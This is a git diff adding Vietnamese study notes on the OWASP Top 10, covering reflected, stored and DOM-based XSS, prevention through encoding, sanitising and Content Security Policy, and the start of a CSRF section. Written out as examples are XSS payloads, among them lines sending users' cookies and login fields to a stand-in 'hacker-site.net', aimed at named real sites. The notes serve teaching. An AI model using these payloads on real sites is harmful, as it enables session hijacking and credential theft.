@@ -14,6 +14,47 @@ Hàng năm, OWASP (the Open Web Application Security Project) công bố 10 lỗ
 ## 6. Security Misconfiguration
 
 ## 7. Cross-site Scripting (XSS)
+- XSS là một trong những tấn công phổ biến và dễ bị tấn công nhất
+- Là 1 client-side attacks
+- Hacker sẽ chèn malicious script (script độc hại) để thực thi chúng ở browser (phía client) (Hacker có thể gửi cho user URL chứa mã độc hoặc user vô tình truy cập vào)
+- Cách test 1 trang web có bị lỗ hổng XSS ko: nếu có thể chèn và run Javascript (Hiển thị alert('XXX') chẳng hạn) thông qua param truyền vào, thì trang đó dính lỗi XSS
+- Thiệt hại:
+  + Account hijacking/session hijacking: user bị chiếm phiên làm việc (hacker lấy được cookie sessionID là có thể mạo danh user được)
+  + Đánh cắp credential: hacker có thể clone trang login và dùng XSS để lấy được username/password của user, chẳng hạn hacker send URL sau cho user login: www.phimmoi.net/login?redirect_to=<script>www.hacker-site.net?user=document.getElementById(username')&pass=document.getElementById('password')</script>
+- Có 3 loại XSS
+
+### 7.1. Reflected XSS
+- Xảy ra khi *malicious script* **không được lưu trên web server** nhưng được phản ánh (reflected) trong kết quả của trang web
+- Với cách tấn công này, hacker chèn mã độc (JS code) vào URL dưới dạng query string
+- VD1: Hacker gửi cho user 1 URL như sau: https://phimmoi.net/search?q=<script>deleteAccount();</script>. Khi user click vô link đó, account của họ trên trang phimmoi sẽ bị xóa
+- VD2: Hacker gửi cho user 1 URL như sau: https://phimmoi.net/name=var+i=new+Image;+i.src="http://hacker-site.net/"%2Bdocument.cookie;
+  + Đoạn Javascript mà hacker tạo ra thực tế như sau:
+  ```
+  var i=new Image; i.src="http://hacker-site.net/"+document.cookie;
+  ```
+  + Dòng lệnh trên bản chất thực hiện request đến site của hacker với tham số là cookie người dùng: session của người dùng sẽ bị chiếm
+- Có thể kiểm tra 1 web có dính lỗ hổng này ko bằng cách thử nhập ```<script>alert('Hacked!!!')</script>``` vào 1 ô input (ô tìm kiếm chẳng hạn), rồi click OK. Nếu browser alert 'Hacked!!!' thì web này bị dính rồi!
+
+### 7.2. Persistent XSS (Stored XSS)
+- Xảy ra khi *malicious script* đang được **lưu trên web server**. Tấn công theo cách này có thể được coi là rủi ro hơn và nó cung cấp nhiều thiệt hại hơn
+- VD: trên forum voz.net, 1 user vào bình luận ở 1 thread với nội dung sau: ```<script>alert(document.cookie)</script>```. Server lưu lại bình luận đó trong database, sau đó bất kỳ user khác khi vào thread đó sẽ gặp bình luận trên và thực thi script đọc toàn bộ cookie của họ. Nếu server mã hóa kí tự trước khi lưu vào database (chẳng hạn "/" => "%2F") thì sẽ ko bị lỗi này!
+
+### 7.3. DOM
+– This occurs, when the DOM environment is being changed, but the code remains the same.
+- VD: https://phimmoi.net?page=1. Sửa param page thành: https://phimmoi.net?page=<script>alert(document.cookie)</script>
+
+### Phòng tránh
+- Encoding: chuyển các kí tự < > thành &lt; %gt;.
+- Validation/Sanitize: loại bỏ hoàn toàn các kí tự khả nghi trong input của người dùng, hoặc thông báo lỗi nếu trong input có các kí tự này. **"Đừng bao giờ tin tưởng input của người dùng"**
+- CSP (Content Security Policy): Với CSP, trình duyệt chỉ chạy Javascript từ những domain được chỉ định. Để sử dụng CSP, server chỉ cần thêm header Content-Security-Policy vào mỗi response. Nội dung header chứa những  domain mà ta tin tưởng:
+```
+Content-Security-Policy: script-src 'self' https://apis..google.com
+```
+
+### Ref
+- https://toidicodedao.com/2016/10/18/lo-hong-bao-mat-xss/
+- https://viblo.asia/p/ky-thuat-tan-cong-xss-va-cach-ngan-chan-YWOZr0Py5Q0
+- https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
 
 ## 8. Insecure Deserialization
 
@@ -22,6 +63,8 @@ Hàng năm, OWASP (the Open Web Application Security Project) công bố 10 lỗ
 ## 10. Insufficient Logging & Monitoring
 
 ## CSRF (Cross Site Request Forgery - Giả mạo request liên trang, còn có tên khác là XSRF)
+Hacker khiến user thực hiện 1 ành động mà họ ko hề biết và ko có ý muốn thực hiện (chẳng hạn chuyển khoản 1000$ từ account của user sang account của hacker)
+
 ### Example 1
 - Trang https://phimmoi.net/account/change-password là trang dùng để đổi password, có nội dung form như sau
 ```html
